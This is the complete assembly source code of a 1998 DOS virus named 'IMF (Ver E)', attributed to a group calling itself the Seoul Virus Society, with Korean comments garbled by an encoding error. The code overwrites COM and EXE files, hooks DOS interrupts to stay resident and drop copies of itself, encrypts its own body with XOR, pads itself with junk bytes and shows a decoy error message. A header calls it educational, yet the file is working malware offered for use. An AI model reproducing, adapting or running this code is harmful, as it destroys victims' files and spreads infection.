;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                              \\\\\\\  \       \  \
;     IMF (Ver E)                             \          \     \   \
;                  by MOV of SVS              \           \   \    \   98/03
;                                             \            \ \     \
;                                              \\\\\\\      \      \\\\\\\ #03
; Virus Name : IMF (Ver E)
; AV Name    : Miny1
; Author     : MOV (Master Of Virus)
; Group      : SVS (Seoul Virus Society)
; Origin     : Corea
; Date       : 1998/02
;
; Type : Non memory Resident COM,EXE  Overwriting
;
; !****************************************************************************!
; *                                                                            *
; * ‰w‰¡ !                                                                     *
; *    ·¡ˆõ·e ¤a·¡œá¯a ­¡¯a Å¡—a·¡”a. Ša·B¸â·¥ ¡¢¸â·a¡ e ¬a¶w–A´á´¡Ðe”a.      *
; *    ¹A¸b¸a“e ·¡ ­¡¯aÅ¡—a¡ ´¡‹¡–A“e ´á˜áÐe ¢…¹AµA ”Ð¬á•¡ À‚·±·i »¡»¡ ´g   *
; *    “e”a. ¥eÑw Ðaˆáa ¯©Ð—Ða»¡  iœa !                                       *
; *                                                                            *
; * Warning !                                                                  *
; *    This is a VIRUS source code. This source code is provieded educational  *
; *    purpose. The author is not responsible for any damage caused by this c  *
; *    ode. Don't modify or execute it !                                       *
; *                                                                            *
; !****************************************************************************!
;
;--------------------------------------------------------------------------
;       ´e‘wÐa­A¶a? Àñ·a¡ ‹i·i³a‘A¶a.             MOV
;       ·¡ ­¡¯a ¶¥œ ‰·ˆ ´eÐia‰¡ Ð–“e•A
;       ¦…¬â•¡ ¹A”¡ ¡µÐa“e ´eµeŠ­¡Ÿi ¶áÐ ·¡‹i·i ³s“¡”a.
;       ·¡¤a·¡œá¯aŸi £¡“¡1.¥eÑw·¡œa‰¡ »¥”eÐa”áŠ…¶a.
;       ¤á¸å·e EÑw·³“¡”a. BÑw‰Á EÑw·¡ ¤i‰e •ö”áŠ…¶a.
;       £¡“¡1¥eÑw·¡œe ­¡Ÿ©—h‰¡ ŠW¸wÓ¡ ‹¡¦…·¡ a¨ö¯s“¡”a.
;       £¡“¡1‰Á §¡ŠaÐa¡e¬á ¥¡¯¡‹¡¤aœs“¡”a.
;       ¯©b·¶“e ¬aœq·e ·¡­¡¯a e ¥Á•¡ ”aŸa”a“eˆé ´iŒó“¡”a.
;--------------------------------------------------------------------------
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

parasize     equ (vend - start+0fh+256) shr 4   ; ¬wºÐi Ça‹¡

seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a
                jumps                           ; Èá¥¡´á­Q e· ¡ww´á

                org     100h


start:           call    passw                  ; ´qÑ¡ÑÁ
                nop                             ; ˆe”eÐe ´eË¡ —¡¤á‹·
                mov     si,9999h
                nop
                nop
start2:
                dec     si
                cmp     si,0 
                jne     start2                  ; 0·¡ ´a“¡¡e ¸ñÎÐaœa
                mov     ah,(2ah xor 72h)        ; i¼a ·ª´á µ¡‹¡ 31·©·¡¡e
                call    xorp                    ; ¡A¯¡»¡ Â‰b
                cmp     dl,31
                je      virmm
start3:
                push    ax                      ; AX,Bx,CX,DX ¸á¸w
                push    bx
                push    cx
                push    dx
                mov     ah,(4eh xor 72h)        ; Àõ ¤å¼ Ìa·©·i Àx“e”a
                mov     dx,offset comfiles      ; COM Ìa·©
                xor     cx,cx                   ; ­¢¬÷·e ·©¤e
                call    xorp
again:
                jc      memt
                
                mov     ax,DS:[80h+1eh]         ; ¢…¸aµi §¡Ša
                cmp     ax,'IW'                 ; ¶å•¡¶ Ìa·©·¥ˆa?
                je      next                    ;  x·a¡e ¸ñÎ
                cmp     ax,'OC'
                je      next                    ; COMMAND Ìa·©·¥ˆa  x·e¡e Í¡‹¡
                mov     ah,(43h xor 72h)        ; ­¢¬÷Ð¹A
                mov     al,01h
                xor     cx,cx
                mov     dx,80h+1eh
                call    xorp
                mov     ah,(3dh xor 72h)        ; Ìa·©·i µe”a
                mov     al,02h
                call    xorp
                xchg    ax,bx                   ; Ìa·©Ð…—iˆt·i bxµA..
                mov     ah,(3fh xor 72h)        ; 3¤a·¡ËaŸi ·ª´áµ¥”a
                mov     dx,offset oldbyte
                mov     cx,3
                call    xorp
                lea     si,oldbyte              ; call ¡ww·¡¡e ¸ñÎÐe”a ·¡£¡
                cmp     byte ptr [si],0e8h      ; ˆqµq•ö·a£a¡.
                je      next
                mov     al,02                   ; Ìa·© {·a¡...
                xor     cx,cx
                xor     dx,dx
                mov     ah,42h
                int     21h
                or      dx,dx                   ; 64000¤a·¡Ëa¥¡”a Ça¡e ”aŸeÌa
                jnz     next                    ; ·©·i.
                mov     al,00                   ; Ìa·© Àá·q·a¡..
                xor     cx,cx
                xor     dx,dx
                mov     ah,(42h xor 72h)
                call    xorp
                mov     ah,2ch                  ; ¯¡ˆe ·ª´áµ¥”a.
                int     21h
                mov     byte ptr gaza1,dl       ; ˆa¼a ˆt·i ¸á¸wÐe”a
                mov     byte ptr gaza2,dl
                mov     byte ptr gaza3,dl
                mov     byte ptr gaza4,dl
                mov     byte ptr gaza5,dl
                mov     byte ptr gaza6,dl
                mov     byte ptr gaza7,dl
                mov     byte ptr gaza8,dl
                mov     byte ptr gaza9,dl
                mov     byte ptr gaza10,dl
                mov     byte ptr gaza11,dl
                mov     byte ptr gaza12,dl
                mov     byte ptr gaza13,dl
                mov     byte ptr gaza14,dl
                mov     byte ptr gaza15,dl
                mov     byte ptr gaza16,dl
                mov     byte ptr gaza17,dl
                mov     byte ptr gaza18,dl
                mov     byte ptr gaza19,dl
                mov     byte ptr gaza20,dl
                mov     byte ptr keygab,18h     ; 18h¡ ´qÑ¡ÑÁ Ðe”a
                call    okw                     ; ¤a·¡œá¯aŸi ³e”a.
                mov     ah,(3eh xor 72h)        ; Ìa·©·i ”h“e”a
                call    xorp

next:
                mov ah,3eh                      ; ¯©®”a – ¤å”h“e”a
                int 21h
                mov ah,(4fh xor 72h)            ; ”a·q Ìa·©·i Àx“e”a
                call xorp
                jmp again

virmm:
                mov ah,(9 xor 72h)              ; ¡A­A»¡ Â‰b
                mov dx,offset virm
                call xorp
                mov ah,4ch                      ; Ìa·©{‹¡
                int 21h

memt:           cmp     di,1                    ; di ˆa 0·¡¡e EXE Ìa·©·i ˆqµq
                je      nextokok                ; ¯¡Ç¥”a.
                mov     ah,4eh
                mov     dx,offset exefiles
                mov     cx,0
                int     21h
                mov     di,1
                jmp     again

nextokok:       mov     ax,3524h                ; ·¥ÈáœóËa24¤å· ¶áÃ¡Ÿi ·ª´áµ¥”a
                int     21h
                mov     word ptr int24x2[0],bx  ; µ¡Ïa­Uˆt¸á¸w
                mov     word ptr int24x2[2],es  ; ­A‹a åËa¤å»¡ˆt ¸á¸w
                mov     ax,2524h                ; ¬¡¶… ·¥ÈáœóËa 24¤å
                mov     dx,offset int24x1
                int     21h
                mov     ah,(35h xor 72h)        ; ·¥ÈáœóËa 2¤å· ¶áÃ¡Ÿi ·ª´áµ¥”a
                mov     al,21h
                call    xorp                 
                mov     word ptr oldint[0],bx   ;µb¯¡  aÀeˆa»¡¡ ¸á¸w
                mov     word ptr oldint[2],es
                mov     ax,offset int_21h_entry ; ¬wºµa¦ ˆñ¬a
                cmp     bx,ax
                je      loc_4
                
                mov     ah,(25h xor 72h)        ; ¬¡¶… ·¥ÈáœóËa 21¤å
                mov     al,21h
                mov     dx,offset int_21h_entry
                call    xorp
                             
                mov     ah,(9 xor 72h)          ; ¬a¶w¸aŸi ­¢·¡‹¡ ¶áÐe ¡A­A»¡
                mov     dx,offset virmsg
                call    xorp
                mov     ax,2524h                ; ¶¥œ· ·¥ÈáœóËa 24¤å ·a¡ •©
                mov     dx,offset int24x2       ; aº…”a.
                int     21h                       
                mov     byte ptr keygab,0       ; ´qÑ¡ÑÁ ˆtµA”a 0·i ý´áº…”a.
                mov     ah,(31h xor 72h)        ; ¡A¡¡Ÿ¡ ¬wº ¸a•· ¹·ža
                mov     dx,parasize
                call    xorp
loc_4:
                mov ah,(9 xor 72h)              ; ¶áµÁ  aÀeˆa»¡
                mov dx,offset virmsg
                call xorp
                mov ax,2524h
                mov dx,offset int24x2
                int 21h
                int 20h

int_21h_entry:
                cmp     ah,4bh                  ; ¯©Ð—·¥ˆa?
                jne     loc_5
                push   ds
                push   ax
                push   bx
                push   cx
                push   dx
                push   si
                push   di
                push   cs
                pop    ds
                mov     ax,3524h                ; ¡A¡¡Ÿ¡ ¬wºÐe¬wÈµA¬á 24¤å·i
                int     21h                     ; ˆa¡À…”a.
                mov     word ptr int24x2[0],bx
                mov     word ptr int24x2[2],es
                mov     ax,2524h
                mov     dx,offset int24x1
                int     21h
                mov     ah,(3Ch xor 72h)        ; Ìa·© ¬—¬÷
                mov     cx,2               
                mov     bx,5             
                mov     dx,offset data_5
                call    xorp                   
                mov     ah,(40h xor 72h)        ; ¤a·¡œá¯aŸi ³e”a
                mov     cx,offset vend - start
                mov     dx,100h
                call    xorp
                mov     ah,(3Eh xor 72h)        ; Ìa·©·i ”h“e”a
                mov     bx,5
                call    xorp
                mov     ax,2524h                ; ·¥24¤å ¥¢Š
                mov     dx,offset int24x2
                int     21h
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax             
                pop     ds
 loc_5:
                jmp     dword ptr cs:oldint     ; ¶¥œ ·¥ÈáœóËa 21¤å·a¡ ¸ñÎ
int24x2 dd ?
int24x1:
                xor ax,ax
                xor bx,bx
                xor cx,cx
                xor dx,dx
                iret
xorp:
                xor ah,72h
                int 21h
ret
data_5          db      'MEM.COM', 0
virmsg          db      'Incorrect DOS version',0ah,0dh,'$'
oldint          dd ?
comfiles        db '*.C?M',0          
exefiles        db '*.E?E',0
oldbyte         db 0cdh,20h,90h                 ; 3¤a·¡Ëa
newmsg:
virm db ' SVS/COREA Made by MOV(Master Of Virus)',0ah,07h,0dh ; e—e·¡ MOV
     db '[IMF Virus] Ver.E (VCL.5249???-> FK2.B)',0ah,07h,0dh
     db '(qnstjr gkffuaus Eht qkfhgo)<--- Hangul',0ah,07h,0dh,'$'
endmsg:                                         ; ´qÑ¡ÑÁ / Ìa·©µA °áº“e ¦¦…
keygab          db ?
okw:
jmp okok1
gaza16          db ?
okok1:
call passw
                jmp okok2
gaza17          db ?
okok2:
                mov al,40h
                jmp okok3
gaza18 db ?
okok3:
                xchg ah,al
                jmp jok1
gaza8 db ?
jok1:
                mov cx,offset vend - start
                jmp okok4
gaza19 db ?
okok4:
                mov dx,100h
                jmp okok5
gaza20 db ?
okok5:
                int 21h
                jmp jok2
gaza9 db ?
jok2:
                call passw
                ret
passw:
                jmp jojo
gaza10 db ?
jojo:
                mov si,103h
                jmp jok3
gaza1 db ?
gaza15 db ?
jok3:
                mov di,103h
                jmp jok4
gaza2 db ?
gaza14 db ?
jok4:
                mov ah,keygab
                jmp jok5
gaza3 db ?
gaza13 db ?
jok5:
                mov cx,offset endmsg - 103h
                jmp mloop
gaza12 db ?
mloop:
                lodsb
                jmp jok6
gaza4 db ?
jok6:
                xor al,ah
jmp jok7
gaza5 db ?
jok7:
                stosb
                jmp jok11
gaza11 db ?
jok11:
                jmp jok8
gaza6 db ?
jok8:
                loop mloop
                jmp jok9
gaza7 db ?
jok9:
                ret

vend:
seg_a           ends

; FK2 ¤a·¡œá¯aµA¬á ·¡£¡ ‹¡¬—Ñw COM EXEŸi ¬å¥¡µv”a
; ˆe”eÐe XOR ´qÑ¡ÑÁ•¡.
; ‹e•A £¡“¡1 ¥eÑw·¡œa‰¡  iÐa“¡ á¢ ‹¡¦…·¡ a«a”a
; ¶áŸi ¥¡¡e ´i‰V»¡ e ”ü´á³a‹¡µÁ ´qÑ¡ÑÁ e œe¸ñ e ™¢ˆ{‰¡
; ¡A¡¡Ÿ¡ ¬wº COM EXE ˆqµq¤w¤ó•¡ ”aŸa”a ¢‰¥ £¡“¡1·e ¡A¡¡Ÿ¡ ¬wºŸi ´eÐe”a
; ‹aœá”å•A ¡A¡¡Ÿ¡µA¬á ¸sÓ¡“eˆå £¡“¡1·a¡ ¸s”áŠ….
; ¸÷ i ‹¡¦… a«a”a £¡“¡1·¡ MEM.COM Ìa·©·i  e—aq?
; Ðažœa•¡ ¨iŸ¡ MINY1.? ---> IMF Virus¡ ¤aŽ¡º‹© ¤aœe”a...
                end     start

